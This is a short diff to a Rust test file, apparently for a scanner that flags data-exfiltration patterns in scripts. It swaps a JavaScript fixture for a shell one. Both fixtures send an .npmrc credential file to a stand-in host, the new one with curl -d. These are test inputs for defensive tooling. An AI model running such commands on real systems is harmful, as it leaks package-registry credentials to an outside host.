@@ -380,10 +380,7 @@ fn identical_flows_are_deduplicated() {
 
 #[test]
 fn non_python_scripts_get_no_signals_yet() {
-    let sigs = run(&[(
-        "a.js",
-        "fetch('https://x.example.invalid', {body: require('fs').readFileSync('/x/.npmrc')})\n",
-    )]);
+    let sigs = run(&[("a.sh", "curl -d @/x/.npmrc https://x.example.invalid\n")]);
     assert!(sigs.is_empty(), "{sigs:#?}");
 }
 
